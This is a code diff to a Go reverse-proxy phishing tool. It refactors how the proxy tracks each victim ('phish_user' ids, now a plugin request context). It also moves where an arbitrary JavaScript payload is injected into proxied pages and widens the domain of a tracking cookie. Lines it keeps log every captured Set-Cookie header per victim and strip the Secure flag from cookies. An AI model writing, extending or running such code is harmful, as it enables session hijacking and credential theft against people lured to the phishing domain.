@@ -41,14 +41,13 @@ type ReverseProxy struct {
 	Target         *url.URL               // target url after going through reverse proxy
 	OriginalTarget string                 // target host before going through reverse proxy
 	Origin         string                 // origin before going through reverse proxy
-	PhishUser      string                 // traced phish_user id
-	InitPhishUser  string                 // traced phish_user id
 	IP             string                 // client ip addr
 	Payload        string                 // JS payload that should be injected
 	Terminate      bool                   // indicates whether this client should be released/terminated
 	Proxy          *httputil.ReverseProxy // instance of Go ReverseProxy that will proxy requests/responses
 	Config         *config.Options
-	IsTLS bool
+	IsTLS          bool
+	RequestContext  *plugin.HTTPContext
 }
 
 type ReverseProxyFactorySettings struct {
@@ -94,16 +93,9 @@ func (p *ReverseProxy) rewriteResponse(r *http.Response) (err error) {
 	// Inject Payloads
 	buffer = p.InjectPayloads(buffer)
 
-	log.Cookies(p.PhishUser, p.Target.String(), response.Header["Set-Cookie"], p.IP)
+	log.Cookies(p.RequestContext.UserID, p.Target.String(), response.Header["Set-Cookie"], p.IP)
 
-	// Hook Plugins
-	ctx := plugin.HTTPContext{
-		Target:    p.Target,
-		IP:        p.IP,
-		Origin:    p.Origin,
-		PhishUser: p.PhishUser,
-	}
-	ctx.InvokeHTTPResponseHooks(response.Response)
+	p.RequestContext.InvokeHTTPResponseHooks(response.Response, &buffer)
 
 	// Compress the HTTP Response and update the HTTP Headers
 	response.Compress(buffer)
@@ -118,18 +110,16 @@ func (p *ReverseProxy) rewriteRequest(r *http.Request) (err error) {
 	request.PatchHeaders(p)
 	request.PatchQueryString()
 
-	// Hook Plugins
-	ctx := plugin.HTTPContext{
-		Target:         p.Target,
-		IP:             p.IP,
-		Origin:         p.Origin,
-		PhishUser:      p.PhishUser,
-		OriginalTarget: p.OriginalTarget,
-		IsTLS: p.IsTLS,
-	}
-	ctx.InvokeHTTPRequestHooks(request.Request)
+	p.RequestContext.OriginalTarget = p.OriginalTarget
+	p.RequestContext.IP = p.IP
+	p.RequestContext.IsTLS = p.IsTLS
+	p.RequestContext.Target = p.Target
+	p.RequestContext.Origin = p.Origin
 
-	log.HTTPRequest(request.Request, p.PhishUser)
+	p.RequestContext.InvokeHTTPRequestHooks(request.Request)
+
+
+	log.HTTPRequest(request.Request, p.RequestContext.UserID)
 
 	// Handle HTTP Body (POST)
 	if r.Body != nil {
@@ -232,7 +222,7 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 	// Patch Cookies:
 	// Prevent phish domain leakage via cookies
 	if len(httpResponse.Header["Set-Cookie"]) > 0 {
-		log.Cookies(p.PhishUser, p.Target.String(), httpResponse.Header["Set-Cookie"], p.IP)
+		log.Cookies(p.RequestContext.UserID, p.Target.String(), httpResponse.Header["Set-Cookie"], p.IP)
 
 		for i, v := range httpResponse.Header["Set-Cookie"] {
 			//strip out the secure Flag
@@ -244,10 +234,10 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 		}
 	}
 
-	if p.InitPhishUser != "" {
+	if p.RequestContext.InitUserID != "" {
 		// Add tracking cookie
-		value := runtime.TrackingCookie + "=" + p.InitPhishUser +
-			";Path=/;Domain=" + runtime.ProxyDomain +
+		value := runtime.TrackingCookie + "=" + p.RequestContext.InitUserID +
+			";Path=/;Domain=." + runtime.ProxyDomain +
 			";Expires=Sat, 26-Oct-2025 18:54:56 GMT;Priority=HIGH"
 		httpResponse.Header.Add("Set-Cookie", value)
 	}
@@ -417,7 +407,7 @@ func (p *ReverseProxy) InjectPayloads(buffer []byte) []byte {
 
 	if len(buffer) > 0 && p.Payload != "" {
 		log.Debugf(" -- Injecting JS Payload [%s] \n", p.Payload)
-		buffer = bytes.Replace(buffer, []byte("</head>"), []byte("<script>"+p.Payload+"</script></head>"), 1)
+		buffer = bytes.Replace(buffer, []byte("</body>"), []byte("<script>"+p.Payload+"</script></body>"), 1)
 	}
 
 	return buffer
@@ -468,6 +458,9 @@ func (s *ReverseProxyFactorySettings) NewReverseProxy() *ReverseProxy {
 		Config:         &s.Options,
 		IsTLS:          s.IsTLS,
 		OriginalTarget: s.originaltarget,
+		RequestContext:  &plugin.HTTPContext{
+			Extra:     make(map[string]string),
+		},
 	}
 
 
